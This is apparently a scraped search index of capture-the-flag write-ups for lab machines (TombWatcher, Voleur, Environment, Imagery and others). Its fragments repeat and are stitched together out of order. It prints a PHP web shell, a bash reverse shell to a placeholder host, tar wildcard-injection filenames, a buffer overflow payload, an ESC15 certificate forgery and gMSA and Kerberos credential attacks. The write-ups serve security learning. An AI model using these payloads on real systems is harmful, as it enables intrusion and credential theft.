Once Alfred is a member of this group, we gain ReadGMSAPassword permission on the user ANSIBLE_DEV$, which allows us to read the password of their Kerberos-managed account and use it to escalate privileges within the domain.\nWe use bloodyAD instead of net rpc because bloodyAD communicates directly with Active Directory via LDAP or modern RPC and can handle domain permissions that net rpc cannot. It is also more reliable for adding users to groups when net rpc fails due to restrictions or compatibility issues.\nbloodyAD -u \u0026#39;alfred\u0026#39; -p \u0026#39;basketball\u0026#39; -d tombwatcher.htb --dc-ip 10.10.11.72 add groupMember INFRASTRUCTURE alfred\r[+] alfred added to INFRASTRUCTURE The next step is to exploit the ReadGMSAPassword permission, and BloodHound shows us how to perform the attack.\nWe clone the gMSADumper repository to our local machine.\ngit clone https://github.com/micahvandeusen/gMSADumper.git And run the following command:\n./gMSADumper.py -u alfred -p basketball -d tombwatcher.htb With this hash, we can authenticate as ANSIBLE_DEV$ on the domain, whether for pass-the-hash, Kerberos attacks, or privilege escalation to access restricted resources.\nThe next step is to force the Sam user to change their password.

See CVE-2024-49019 or the wiki for more details. The WebServer template has a vulnerability (ESC15) that allows us to create a certificate as if we were another user. This means we could gain access to important accounts, including Domain Admin, and use it to escalate privileges within the domain. Instructions for exploitation: ESC15\nTo exploit the vulnerability, we first request a certificate in the name of the Administrator using Certipy.\ncertipy-ad req -dc-ip 10.10.11.72 -ca tombwatcher-CA-1 -target DC01.tombwatcher.htb -u cert_admin@tombwatcher.htb -p \u0026#39;admin1234\u0026#39; -template WebServer -upn administrator@tombwatcher.htb -application-policies \u0026#39;Client Authentication\u0026#39; This command generates a .pfx file containing the certificate with Administrator privileges.\nNext, we use that certificate to authenticate and open an LDAP session with administrative access.\ncertipy-ad auth -pfx administrator.pfx -dc-ip 10.10.11.72 -ldap-shell This gives us a Domain Admin session, allowing us to control the domain and execute critical actions.\nUsing the help command, we see what actions can be executed.\nWe can change the Administrator user’s password.\nFinally, we obtain the Root Flag and complete the machine!!\n","permalink":"http://localhost:1313/writeups/medium/tombwatcher/","summary":"Difficulty: Medium 🟠","title":"TombWatcher - Hack The Box"},{"content":"\rWe start by performing a quick port scan with Nmap to see which ports are open.\nsudo nmap -sS -p- --min-rate 4500 -n -Pn -vvv 10.10.11.76 Using these ports, we now perform a deeper scan, saving the results to a file called \u0026ldquo;target\u0026rdquo;.\nnmap -sCV -p445,135,139,53,88,49668,389,2222,3268,58816,5985,58833,58815,58828,3269 -n -Pn 10.10.11.76 -oN target We add the domain to the /etc/hosts file so we can resolve both the domain and the domain controller name.\nTo start hacking the machine, we are given some initial credentials.\nryan.naylor : HollowOct31Nyt When trying to enumerate SMB shares with the credentials ryan.naylor:HollowOct31Nyt, authentication fails. This is not because the credentials are wrong, but because the Active Directory server does not allow direct authentication with username and password, it requires Kerberos. In other words, before interacting with SMB, we need a TGT (Ticket Granting Ticket) that proves our identity to the KDC (Key Distribution Center, the central server that issues authentication tickets in the domain).\nTo obtain the TGT, we first synchronize the clock with the domain server, since Kerberos is sensitive to time differences.\nsudo ntpdate voleur.htb Since Kali doesn’t sync directly with the domain server using ntpdate, I used faketime to simulate the correct time in the process of generating the ticket.\nfaketime \u0026#39;YYYY-MM-DD HH:MM:SS\u0026#39; impacket-getTGT voleur.htb/\u0026#39;ryan.naylor\u0026#39;:\u0026#39;HollowOct31Nyt\u0026#39; Then, I exported the generated file to the KRB5CCNAME environment variable.\nexport KRB5CCNAME=$PWD/ryan.naylor.ccache This tells all Kerberos tools (and SMB in our case) to use that ticket instead of attempting to authenticate directly with the password.\nYou can use klist to verify that the ticket was loaded correctly.\nNow, to access the shared resources, instead of smbclient I used impacket-smbclient, as it offers more reliable Kerberos support and allows directly using cached tickets (-k -no-pass).\nfaketime \u0026#34;$(ntpdate -q voleur.htb | awk \u0026#39;{print $1 \u0026#34; \u0026#34; $2}\u0026#39;)\u0026#34; impacket-smbclient -k -no-pass -dc-ip 10.10.11.76 VOLEUR.HTB/ryan.naylor@dc.voleur.htb We found an Excel file that is password protected, so we cannot open it directly.

In case the id_rsa is not in that directory but, for example, in /root/.ssh/id_rsa, we should create a symbolic link pointing to it like this:\nln -s /root/.ssh/id_rsa id_rsa With this approach, we can obtain any file owned by root without any issues.

We will test it with:\nhttp://environment.htb/?--env=test We continue exploring other paths to see if we can find something more useful.\nThe interesting part is found on the /login page.\nIf we intercept the request with Burp Suite and leave the “remember” field empty, submitting the request will trigger a code error.\nAs we can see, if we change the environment to “preprod”, it gives us a session as the user with ID 1 and redirects us to /management/dashboard. Since Laravel is vulnerable to changing the environment name, we can access it without issues.\nWe are logged in as Hish, but we don’t find any direct way to access the machine. For now, the only available attack vector is uploading Hish’s profile picture.\nFirst, we test if we can upload an image, and it works without issues.\nNow, the challenge is to upload a malicious file that allows code execution, making it appear as an image to the website, even though it actually contains PHP code.\nWe could try uploading the following code, which would allow us to execute commands remotely and even establish a reverse shell:\n\u0026lt;?php\recho \u0026#34;\u0026lt;pre\u0026gt;\u0026#34; . shell_exec($_REQUEST[\u0026#39;cmd\u0026#39;]) . \u0026#34;\u0026lt;/pre\u0026gt;\u0026#34;;\r?\u0026gt; We managed to upload it by bypassing with \u0026ldquo;cmd.php.\u0026rdquo;.

We also see a folder called backup.\nInside the backup folder, there is a file called keyvault.gpg, which is an encrypted GPG file that could contain sensitive information such as keys, passwords, or important configuration data.\nA user’s GPG keys are usually stored in their home directory, inside a hidden folder called .gnupg. This folder contains both public and private keys, the trust database, and GPG configuration. Only the owning user and root should normally have access.\nThis is vulnerable because the .gnupg directory has too permissive permissions, any user on the system can read its contents and enter it, even if they cannot modify it. Since private keys and sensitive GPG data are stored here, these permissions allow us to finally extract the contents of keyvault.gpg.\nTo do this, we copy the entire .gnupg content to a directory where we have write permissions, such as /tmp, and then we can use that directory as the --homedir for the gpg command. This allows us to access the user’s keys and perform encryption or decryption operations without being the original directory owner.\ncd /tmp \u0026amp;\u0026amp; mkdir gnupg\rcp -r /home/hish/.gnupg/* ./gnupg\rgpg --homedir=./gnupg -d /home/hish/backup/keyvault.gpg And we succeed in getting the password for the user Hish on this machine.\nPrivilege escalation to Root Running sudo -l, we see that we can execute the systeminfo script as any user without needing to provide a password.\nScript contents:\n#!/bin/bash\recho -e \u0026#34;\\n### Displaying kernel ring buffer logs (dmesg) ###\u0026#34;\rdmesg | tail -n 10\recho -e \u0026#34;\\n### Checking system-wide open ports ###\u0026#34;\rss -antlp\recho -e \u0026#34;\\n### Displaying information about all mounted filesystems ###\u0026#34;\rmount | column -t\recho -e \u0026#34;\\n### Checking system resource limits ###\u0026#34;\rulimit -a\recho -e \u0026#34;\\n### Displaying loaded kernel modules ###\u0026#34;\rlsmod | head -n 10\recho -e \u0026#34;\\n### Checking disk usage for all filesystems ###\u0026#34;\rdf -h As we can see, this script doesn’t contain anything interesting and doesn’t allow privilege escalation.

This time we upload any valid image and then click Transform Image (for example, “crop”), intercepting that request in Burp Suite.\nThe next step is to inject a Reverse Shell into a field that should only contain numbers, so the server executes it and gives us remote access.\nPrivilege escalation to Mark Now that we’re in as the user web, the next step is to run LinPEAS to search for escalation vectors: SUID/weak permissions, credentials in files, misconfigured services, and scheduled tasks we can abuse.\nwget -q https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh We find an encrypted backup that could contain credentials or sensitive data from what appears to be the website.\nWe bring it to our local machine and see it was encrypted using pyAesCrypt. To decrypt it we use pyAesDecrypt, which allows a dictionary attack to find the password.\nWe decompress the file and inside find the website backup. When we read db.json this time, it also contains the encrypted password for user mark, so we again use hashcat to crack it.\nhashcat -m 0 -a 0 hash /usr/share/wordlists/rockyou.txt We log in as user Mark and obtain the User Flag.\nPrivilege escalation to Root Running sudo -l shows we can run the binary charcol as root without providing a password.\nExecuting it reveals a program for performing backups; there is a shell option where we can run several commands to perform different functions.\nWhen we enter help it lists several commands we can run and a brief explanation of how to use them.\n","permalink":"http://localhost:1313/writeups/medium/imagery/","summary":"Difficulty: Medium 🟠","title":"Imagery - Hack The Box"},{"content":"Writeup in Spanish 🇪🇸 ","permalink":"http://localhost:1313/writeups/medium/immortal/","summary":"Difficulty: Medium 🟠","title":"Immortal - HackMyVM"},{"content":"Writeup in Spanish 🇪🇸 ","permalink":"http://localhost:1313/writeups/very-easy/injection/","summary":"Difficulty: Very Easy 🔵","title":"Injection - Dockerlabs"},{"content":"\rMachine Link\nTo find the IP of the victim machine, I use the arp-scan command to discover the devices connected to my local network and locate the one whose** MAC address** starts with 08:, indicating it is a VirtualBox virtual machine.\nsudo arp-scan -I eth0 --localnet Next, we proceed with a quick scan using NMAP to see which ports are open.\nsudo nmap -sS --min-rate 4500 -n -Pn 192.168.18.163 Ports 22 and 80 are open\rAnd now we perform a more detailed scan on those open ports and save the result in a file called target.txt.\nnmap -sCV -p22,80 -n -Pn 192.168.18.163 -oN target.txt Detailed scan of the open ports\rWe observe a website hosted on this machine via port 80, but only the default Nginx homepage is visible.\nI use Gobuster to enumerate hidden files and directories.

In this case, we need to perform 2 privilege escalations to become the root user.\nPrivilege escalation to helder Now, let\u0026rsquo;s use LinPEAS, a tool for enumeration and security auditing. It focuses on identifying files with the SUID (Set User ID) and SGID (Set Group ID) permission bits set, which can potentially be exploited by attackers to escalate privileges and gain unauthorized access.\nWe download LinPEAS with the following command:\nwget -q https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh We grant permissions for its execution and run it, saving the results in a file named LinpeasLog.\n./linpeas.sh \u0026gt; LinpeasLog And after some time of searching, I come across the following:\n📝 NOTE: The opasswd file stores users\u0026rsquo; old passwords in Linux to prevent them from reusing them when changing their password.\nAlthough it says it was Jack’s password, since some people reuse passwords (which is bad practice) we decided to check if it works for Helder. I tried it, and it worked. We obtained the user flag.\nUpon realizing that LinPEAS didn\u0026rsquo;t reveal anything new, I decide to use pspy. It is a process monitoring tool that provides real-time visibility into running processes without requiring elevated privileges. I downloaded it to my local machine and transferred it to the target machine by hosting a simple Python web server.\nNow we grant permissions and execute it.\nResult\rWe discovered a script that runs every minute as the root user (UID 0) and uses netcat to connect to localhost on port 10000, saving the data exchanged over the connection to a file named out in /root/.local/. Afterwards, it compares the contents of /root/.local/helder.txt and /home/helder/passwd.txt. If they match, it sets the SUID bit on the executable located in /usr/bin/, with the filename specified by the content of the out file.\nTo achieve this, the first step is to create the passwd.txt file in /home/helder as a symbolic link pointing to /root/.local/helder.txt. This ensures that passwd.txt contains the same content as helder.txt, so the condition will be true.\nln -s /root/.local/helder.txt /home/helder/passwd.txt ⚠️ IMPORTANT: A symbolic link is like a shortcut that points to another file. When a program accesses the link, it actually reads the file it points to. So even if you don’t own the original file, the program can access it through the link.\nThen, we check with the following command to confirm that it indeed points to /root/.local/helder.txt.\nls -la /home/helder/passwd.txt Now, we listen on port 10000 and send the text \u0026lsquo;bash\u0026rsquo;. When the script runs, it will save this input to the out file and set the SUID bit on the corresponding executable in /usr/bin/. In this case, we\u0026rsquo;re granting SUID permissions to bash.\necho \u0026#39;bash\u0026#39; | nc -lvnp 10000 What I mentioned can be observed in the code\rAfter executing the exploit, we notice a brief connection.

When we access the website, we see that we can upload an image.\nBy enumerating directories and files with Gobuster, we discover the existence of a directory called /uploads, nothing else is visible.\nThis is where the images uploaded by users are stored.\nWe try uploading an image to see if it works.\nThe only way I see to gain access to the machine is to upload a file that allows us to execute commands without the machine noticing, making it think it is just an image. For example, we could embed malicious PHP code into a supposed image.\n\u0026lt;?php\recho \u0026#34;\u0026lt;pre\u0026gt;\u0026#34; . shell_exec($_REQUEST[\u0026#39;cmd\u0026#39;]) . \u0026#34;\u0026lt;/pre\u0026gt;\u0026#34;;\r?\u0026gt; We will create a file on our local machine called cmd.php.jpg containing the previous code, and when uploading it, we will intercept the request with Burp Suite. In the “Filename” field, we will change it to cmd.php while keeping the MIME type as if it were an image.\nWe upload it without any issues, and now we can execute any command.\nTo access the machine, we will use a Reverse Shell.\nNow that we are inside the machine, let’s see why it was so easy to exploit by uploading a PHP file without being detected.\nAs we can see, it only restricted by MIME type, without actually verifying that the file was truly an image or a GIF.\nThe www-data user is part of the developers group, and we see that they own two directories.\nIn /opt/project, we find an HTML file for someone named Vlad, but there’s not much else here.\nIn the other directory, it seems to contain a backup of what looks like the previous project.\nSince there’s nothing else particularly interesting, we could use the tool pspy to see which processes and tasks are running on the system in real time.\nWe can see that every minute, the Developer user performs a backup of everything in /opt/project, placing it into a file called project.tgz inside /var/backups/ and compressing it with gzip to save space.\nIt is vulnerable because we have write permissions and it uses * to include all files. If there’s a file with a malicious name, that name could be executed as a command during the backup. Here’s an explanation on how to exploit this vulnerability: Wildcard Injection\nWe execute the following commands in /opt/project and wait to receive the shell:\necho \u0026#34;bash -i \u0026gt;\u0026amp; /dev/tcp/YOUR_IP/PORT 0\u0026gt;\u0026amp;1\u0026#34; \u0026gt; revshell.sh\recho \u0026#34;\u0026#34; \u0026gt; --checkpoint=1\recho \u0026#34;\u0026#34; \u0026gt; \u0026#34;--checkpoint-action=exec=bash revshell.sh\u0026#34; We are now the Developer user.\nBy running the command sudo -l, we see that the script sysinfo.sh can be executed as alfonso without providing a password.\nThe script is vulnerable because it uses eval with user input, which allows executing dangerous commands. An attacker can exploit this to run any command.\nTo test this, in the first input we enter 1, and in the second input we enter the command id, but we precede it with a ; to separate commands. It will then execute:\ndf; id It is vulnerable, so it’s as simple as running a Reverse Shell to become alfonso.\nNow we can retrieve the User Flag.\nRoot Escalation The last step is to escalate to root. Again, by using sudo -l, we see that we can execute a binary as any user without providing their password. We could try to exploit this to escalate to root.\nWe copy the file to Alfonso’s folder, start a temporary web server with Python, and download the binary to our local machine to test it in a more controlled environment.\nWe give it execution permissions and run it.\nWe can see that it outputs user data from /etc/passwd.\nNow, we will open it with Ghidra to analyze how it is implemented internally.\nWe can now see that it might be vulnerable to a Buffer Overflow because gets(buffer) allows writing more data than the buffer can hold, overwriting memory and potentially executing malicious code.\nHowever, by examining the code further, we find a function that has never been executed, which prints the contents of the /etc/shadow file.\nThe plan is to exploit it using a Buffer Overflow to ultimately execute this function called get_shadow.\nBuffer Overflow Exploitation We will first create the complete payload on our local machine using gdb. Here’s a guide on how to exploit a buffer overflow to execute functions: Buffer Overflow - Invoking Functions\nFirst, we create a pattern to find the offset and run the script, providing this pattern as input.\n📝NOTE: In a Buffer Overflow, the offset is the number of bytes needed to reach the return address, which in x86 corresponds to the EIP. Overwriting it allows controlling where the program jumps when the function ends.\nr \u0026lt;\u0026lt;\u0026lt; \u0026#39;PATTERN\u0026#39; Now we can calculate how many characters are needed to reach the EIP with this command:\npattern offset $eip We can verify it like this to confirm the offset is actually 76:\nr \u0026lt;\u0026lt;\u0026lt; $(python3 -c \u0026#39;print(\u0026#34;A\u0026#34;*76 + \u0026#34;B\u0026#34;*4)\u0026#39;) It is indeed 76. Next, we need the memory address of the get_shadow function we found earlier in Ghidra.\np get_shadow We must write the address in little-endian (for example, 0x080484b6 as \\xb6\\x84\\x04\\x08), since systems store multi-byte values in that order for the function to execute correctly.\nIn our case, it will be:\n\\x05\\x99\\x04\\x08 We start converting from the end to the beginning.\rNow we have everything. Instead of BBBB, we use \\x05\\x99\\x04\\x08. The best way to execute it is:\n./silentgets \u0026lt;\u0026lt;\u0026lt; $(python3 -c \u0026#39;import sys; sys.stdout.buffer.write(b\u0026#34;A\u0026#34;*76 + b\u0026#34;\\x05\\x99\\x04\\x08\u0026#34;)\u0026#39;) We will run it directly on the target machine, using sudo and the full path to the binary.\nsudo /usr/bin/silentgets \u0026lt;\u0026lt;\u0026lt; $(python3 -c \u0026#39;import sys; sys.stdout.buffer.write(b\u0026#34;A\u0026#34;*76 + b\u0026#34;\\x05\\x99\\x04\\x08\u0026#34;)\u0026#39;) We obtain the root user’s password hash, which we will crack using hashcat.\nhashcat -m 1800 hash.txt /usr/share/wordlists/rockyou.txt Password obtained!

This allows us to perform a Kerberoasting attack to obtain their password hash and escalate privileges within the domain.\nTo do this, we first clone the targetedKerberoast repository.\ngit clone https://github.com/ShutdownRepo/targetedKerberoast.git To perform the attack, we need to be time-synchronized.\nsudo ntpdate tombwatcher.htb In my case, I use ntpdate only to get the target machine’s time, then use faketime, because on Kali the time doesn’t sync properly.

Once Alfred is a member of this group, we gain ReadGMSAPassword permission on the user ANSIBLE_DEV$, which allows us to read the password of their Kerberos-managed account and use it to escalate privileges within the domain.\nWe use bloodyAD instead of net rpc because bloodyAD communicates directly with Active Directory via LDAP or modern RPC and can handle domain permissions that net rpc cannot. It is also more reliable for adding users to groups when net rpc fails due to restrictions or compatibility issues.\nbloodyAD -u \u0026#39;alfred\u0026#39; -p \u0026#39;basketball\u0026#39; -d tombwatcher.htb --dc-ip 10.10.11.72 add groupMember INFRASTRUCTURE alfred\r[+] alfred added to INFRASTRUCTURE The next step is to exploit the ReadGMSAPassword permission, and BloodHound shows us how to perform the attack.\nWe clone the gMSADumper repository to our local machine.\ngit clone https://github.com/micahvandeusen/gMSADumper.git And run the following command:\n./gMSADumper.py -u alfred -p basketball -d tombwatcher.htb With this hash, we can authenticate as ANSIBLE_DEV$ on the domain, whether for pass-the-hash, Kerberos attacks, or privilege escalation to access restricted resources.\nThe next step is to force the Sam user to change their password.

See CVE-2024-49019 or the wiki for more details. The WebServer template has a vulnerability (ESC15) that allows us to create a certificate as if we were another user. This means we could gain access to important accounts, including Domain Admin, and use it to escalate privileges within the domain. Instructions for exploitation: ESC15\nTo exploit the vulnerability, we first request a certificate in the name of the Administrator using Certipy.\ncertipy-ad req -dc-ip 10.10.11.72 -ca tombwatcher-CA-1 -target DC01.tombwatcher.htb -u cert_admin@tombwatcher.htb -p \u0026#39;admin1234\u0026#39; -template WebServer -upn administrator@tombwatcher.htb -application-policies \u0026#39;Client Authentication\u0026#39; This command generates a .pfx file containing the certificate with Administrator privileges.\nNext, we use that certificate to authenticate and open an LDAP session with administrative access.\ncertipy-ad auth -pfx administrator.pfx -dc-ip 10.10.11.72 -ldap-shell This gives us a Domain Admin session, allowing us to control the domain and execute critical actions.\nUsing the help command, we see what actions can be executed.\nWe can change the Administrator user’s password.\nFinally, we obtain the Root Flag and complete the machine!!\n","permalink":"http://localhost:1313/writeups/medium/tombwatcher/","summary":"Difficulty: Medium 🟠","title":"TombWatcher - Hack The Box"},{"content":"\rWe start by performing a quick port scan with Nmap to see which ports are open.\nsudo nmap -sS -p- --min-rate 4500 -n -Pn -vvv 10.10.11.76 Using these ports, we now perform a deeper scan, saving the results to a file called \u0026ldquo;target\u0026rdquo;.\nnmap -sCV -p445,135,139,53,88,49668,389,2222,3268,58816,5985,58833,58815,58828,3269 -n -Pn 10.10.11.76 -oN target We add the domain to the /etc/hosts file so we can resolve both the domain and the domain controller name.\nTo start hacking the machine, we are given some initial credentials.\nryan.naylor : HollowOct31Nyt When trying to enumerate SMB shares with the credentials ryan.naylor:HollowOct31Nyt, authentication fails. This is not because the credentials are wrong, but because the Active Directory server does not allow direct authentication with username and password, it requires Kerberos. In other words, before interacting with SMB, we need a TGT (Ticket Granting Ticket) that proves our identity to the KDC (Key Distribution Center, the central server that issues authentication tickets in the domain).\nTo obtain the TGT, we first synchronize the clock with the domain server, since Kerberos is sensitive to time differences.\nsudo ntpdate voleur.htb Since Kali doesn’t sync directly with the domain server using ntpdate, I used faketime to simulate the correct time in the process of generating the ticket.\nfaketime \u0026#39;YYYY-MM-DD HH:MM:SS\u0026#39; impacket-getTGT voleur.htb/\u0026#39;ryan.naylor\u0026#39;:\u0026#39;HollowOct31Nyt\u0026#39; Then, I exported the generated file to the KRB5CCNAME environment variable.\nexport KRB5CCNAME=$PWD/ryan.naylor.ccache This tells all Kerberos tools (and SMB in our case) to use that ticket instead of attempting to authenticate directly with the password.\nYou can use klist to verify that the ticket was loaded correctly.\nNow, to access the shared resources, instead of smbclient I used impacket-smbclient, as it offers more reliable Kerberos support and allows directly using cached tickets (-k -no-pass).\nfaketime \u0026#34;$(ntpdate -q voleur.htb | awk \u0026#39;{print $1 \u0026#34; \u0026#34; $2}\u0026#39;)\u0026#34; impacket-smbclient -k -no-pass -dc-ip 10.10.11.76 VOLEUR.HTB/ryan.naylor@dc.voleur.htb We found an Excel file that is password protected, so we cannot open it directly.

In case the id_rsa is not in that directory but, for example, in /root/.ssh/id_rsa, we should create a symbolic link pointing to it like this:\nln -s /root/.ssh/id_rsa id_rsa With this approach, we can obtain any file owned by root without any issues.

We will test it with:\nhttp://environment.htb/?--env=test We continue exploring other paths to see if we can find something more useful.\nThe interesting part is found on the /login page.\nIf we intercept the request with Burp Suite and leave the “remember” field empty, submitting the request will trigger a code error.\nAs we can see, if we change the environment to “preprod”, it gives us a session as the user with ID 1 and redirects us to /management/dashboard. Since Laravel is vulnerable to changing the environment name, we can access it without issues.\nWe are logged in as Hish, but we don’t find any direct way to access the machine. For now, the only available attack vector is uploading Hish’s profile picture.\nFirst, we test if we can upload an image, and it works without issues.\nNow, the challenge is to upload a malicious file that allows code execution, making it appear as an image to the website, even though it actually contains PHP code.\nWe could try uploading the following code, which would allow us to execute commands remotely and even establish a reverse shell:\n\u0026lt;?php\recho \u0026#34;\u0026lt;pre\u0026gt;\u0026#34; . shell_exec($_REQUEST[\u0026#39;cmd\u0026#39;]) . \u0026#34;\u0026lt;/pre\u0026gt;\u0026#34;;\r?\u0026gt; We managed to upload it by bypassing with \u0026ldquo;cmd.php.\u0026rdquo;.

We also see a folder called backup.\nInside the backup folder, there is a file called keyvault.gpg, which is an encrypted GPG file that could contain sensitive information such as keys, passwords, or important configuration data.\nA user’s GPG keys are usually stored in their home directory, inside a hidden folder called .gnupg. This folder contains both public and private keys, the trust database, and GPG configuration. Only the owning user and root should normally have access.\nThis is vulnerable because the .gnupg directory has too permissive permissions, any user on the system can read its contents and enter it, even if they cannot modify it. Since private keys and sensitive GPG data are stored here, these permissions allow us to finally extract the contents of keyvault.gpg.\nTo do this, we copy the entire .gnupg content to a directory where we have write permissions, such as /tmp, and then we can use that directory as the --homedir for the gpg command. This allows us to access the user’s keys and perform encryption or decryption operations without being the original directory owner.\ncd /tmp \u0026amp;\u0026amp; mkdir gnupg\rcp -r /home/hish/.gnupg/* ./gnupg\rgpg --homedir=./gnupg -d /home/hish/backup/keyvault.gpg And we succeed in getting the password for the user Hish on this machine.\nPrivilege escalation to Root Running sudo -l, we see that we can execute the systeminfo script as any user without needing to provide a password.\nScript contents:\n#!/bin/bash\recho -e \u0026#34;\\n### Displaying kernel ring buffer logs (dmesg) ###\u0026#34;\rdmesg | tail -n 10\recho -e \u0026#34;\\n### Checking system-wide open ports ###\u0026#34;\rss -antlp\recho -e \u0026#34;\\n### Displaying information about all mounted filesystems ###\u0026#34;\rmount | column -t\recho -e \u0026#34;\\n### Checking system resource limits ###\u0026#34;\rulimit -a\recho -e \u0026#34;\\n### Displaying loaded kernel modules ###\u0026#34;\rlsmod | head -n 10\recho -e \u0026#34;\\n### Checking disk usage for all filesystems ###\u0026#34;\rdf -h As we can see, this script doesn’t contain anything interesting and doesn’t allow privilege escalation.

This time we upload any valid image and then click Transform Image (for example, “crop”), intercepting that request in Burp Suite.\nThe next step is to inject a Reverse Shell into a field that should only contain numbers, so the server executes it and gives us remote access.\nPrivilege escalation to Mark Now that we’re in as the user web, the next step is to run LinPEAS to search for escalation vectors: SUID/weak permissions, credentials in files, misconfigured services, and scheduled tasks we can abuse.\nwget -q https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh We find an encrypted backup that could contain credentials or sensitive data from what appears to be the website.\nWe bring it to our local machine and see it was encrypted using pyAesCrypt. To decrypt it we use pyAesDecrypt, which allows a dictionary attack to find the password.\nWe decompress the file and inside find the website backup. When we read db.json this time, it also contains the encrypted password for user mark, so we again use hashcat to crack it.\nhashcat -m 0 -a 0 hash /usr/share/wordlists/rockyou.txt We log in as user Mark and obtain the User Flag.\nPrivilege escalation to Root Running sudo -l shows we can run the binary charcol as root without providing a password.\nExecuting it reveals a program for performing backups; there is a shell option where we can run several commands to perform different functions.\nWhen we enter help it lists several commands we can run and a brief explanation of how to use them.\n","permalink":"http://localhost:1313/writeups/medium/imagery/","summary":"Difficulty: Medium 🟠","title":"Imagery - Hack The Box"},{"content":"Writeup in Spanish 🇪🇸 ","permalink":"http://localhost:1313/writeups/medium/immortal/","summary":"Difficulty: Medium 🟠","title":"Immortal - HackMyVM"},{"content":"Writeup in Spanish 🇪🇸 ","permalink":"http://localhost:1313/writeups/very-easy/injection/","summary":"Difficulty: Very Easy 🔵","title":"Injection - Dockerlabs"},{"content":"\rMachine Link\nTo find the IP of the victim machine, I use the arp-scan command to discover the devices connected to my local network and locate the one whose** MAC address** starts with 08:, indicating it is a VirtualBox virtual machine.\nsudo arp-scan -I eth0 --localnet Next, we proceed with a quick scan using NMAP to see which ports are open.\nsudo nmap -sS --min-rate 4500 -n -Pn 192.168.18.163 Ports 22 and 80 are open\rAnd now we perform a more detailed scan on those open ports and save the result in a file called target.txt.\nnmap -sCV -p22,80 -n -Pn 192.168.18.163 -oN target.txt Detailed scan of the open ports\rWe observe a website hosted on this machine via port 80, but only the default Nginx homepage is visible.\nI use Gobuster to enumerate hidden files and directories.

In this case, we need to perform 2 privilege escalations to become the root user.\nPrivilege escalation to helder Now, let\u0026rsquo;s use LinPEAS, a tool for enumeration and security auditing. It focuses on identifying files with the SUID (Set User ID) and SGID (Set Group ID) permission bits set, which can potentially be exploited by attackers to escalate privileges and gain unauthorized access.\nWe download LinPEAS with the following command:\nwget -q https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh We grant permissions for its execution and run it, saving the results in a file named LinpeasLog.\n./linpeas.sh \u0026gt; LinpeasLog And after some time of searching, I come across the following:\n📝 NOTE: The opasswd file stores users\u0026rsquo; old passwords in Linux to prevent them from reusing them when changing their password.\nAlthough it says it was Jack’s password, since some people reuse passwords (which is bad practice) we decided to check if it works for Helder. I tried it, and it worked. We obtained the user flag.\nUpon realizing that LinPEAS didn\u0026rsquo;t reveal anything new, I decide to use pspy. It is a process monitoring tool that provides real-time visibility into running processes without requiring elevated privileges. I downloaded it to my local machine and transferred it to the target machine by hosting a simple Python web server.\nNow we grant permissions and execute it.\nResult\rWe discovered a script that runs every minute as the root user (UID 0) and uses netcat to connect to localhost on port 10000, saving the data exchanged over the connection to a file named out in /root/.local/. Afterwards, it compares the contents of /root/.local/helder.txt and /home/helder/passwd.txt. If they match, it sets the SUID bit on the executable located in /usr/bin/, with the filename specified by the content of the out file.\nTo achieve this, the first step is to create the passwd.txt file in /home/helder as a symbolic link pointing to /root/.local/helder.txt. This ensures that passwd.txt contains the same content as helder.txt, so the condition will be true.\nln -s /root/.local/helder.txt /home/helder/passwd.txt ⚠️ IMPORTANT: A symbolic link is like a shortcut that points to another file. When a program accesses the link, it actually reads the file it points to. So even if you don’t own the original file, the program can access it through the link.\nThen, we check with the following command to confirm that it indeed points to /root/.local/helder.txt.\nls -la /home/helder/passwd.txt Now, we listen on port 10000 and send the text \u0026lsquo;bash\u0026rsquo;. When the script runs, it will save this input to the out file and set the SUID bit on the corresponding executable in /usr/bin/. In this case, we\u0026rsquo;re granting SUID permissions to bash.\necho \u0026#39;bash\u0026#39; | nc -lvnp 10000 What I mentioned can be observed in the code\rAfter executing the exploit, we notice a brief connection.

When we access the website, we see that we can upload an image.\nBy enumerating directories and files with Gobuster, we discover the existence of a directory called /uploads, nothing else is visible.\nThis is where the images uploaded by users are stored.\nWe try uploading an image to see if it works.\nThe only way I see to gain access to the machine is to upload a file that allows us to execute commands without the machine noticing, making it think it is just an image. For example, we could embed malicious PHP code into a supposed image.\n\u0026lt;?php\recho \u0026#34;\u0026lt;pre\u0026gt;\u0026#34; . shell_exec($_REQUEST[\u0026#39;cmd\u0026#39;]) . \u0026#34;\u0026lt;/pre\u0026gt;\u0026#34;;\r?\u0026gt; We will create a file on our local machine called cmd.php.jpg containing the previous code, and when uploading it, we will intercept the request with Burp Suite. In the “Filename” field, we will change it to cmd.php while keeping the MIME type as if it were an image.\nWe upload it without any issues, and now we can execute any command.\nTo access the machine, we will use a Reverse Shell.\nNow that we are inside the machine, let’s see why it was so easy to exploit by uploading a PHP file without being detected.\nAs we can see, it only restricted by MIME type, without actually verifying that the file was truly an image or a GIF.\nThe www-data user is part of the developers group, and we see that they own two directories.\nIn /opt/project, we find an HTML file for someone named Vlad, but there’s not much else here.\nIn the other directory, it seems to contain a backup of what looks like the previous project.\nSince there’s nothing else particularly interesting, we could use the tool pspy to see which processes and tasks are running on the system in real time.\nWe can see that every minute, the Developer user performs a backup of everything in /opt/project, placing it into a file called project.tgz inside /var/backups/ and compressing it with gzip to save space.\nIt is vulnerable because we have write permissions and it uses * to include all files. If there’s a file with a malicious name, that name could be executed as a command during the backup. Here’s an explanation on how to exploit this vulnerability: Wildcard Injection\nWe execute the following commands in /opt/project and wait to receive the shell:\necho \u0026#34;bash -i \u0026gt;\u0026amp; /dev/tcp/YOUR_IP/PORT 0\u0026gt;\u0026amp;1\u0026#34; \u0026gt; revshell.sh\recho \u0026#34;\u0026#34; \u0026gt; --checkpoint=1\recho \u0026#34;\u0026#34; \u0026gt; \u0026#34;--checkpoint-action=exec=bash revshell.sh\u0026#34; We are now the Developer user.\nBy running the command sudo -l, we see that the script sysinfo.sh can be executed as alfonso without providing a password.\nThe script is vulnerable because it uses eval with user input, which allows executing dangerous commands. An attacker can exploit this to run any command.\nTo test this, in the first input we enter 1, and in the second input we enter the command id, but we precede it with a ; to separate commands. It will then execute:\ndf; id It is vulnerable, so it’s as simple as running a Reverse Shell to become alfonso.\nNow we can retrieve the User Flag.\nRoot Escalation The last step is to escalate to root. Again, by using sudo -l, we see that we can execute a binary as any user without providing their password. We could try to exploit this to escalate to root.\nWe copy the file to Alfonso’s folder, start a temporary web server with Python, and download the binary to our local machine to test it in a more 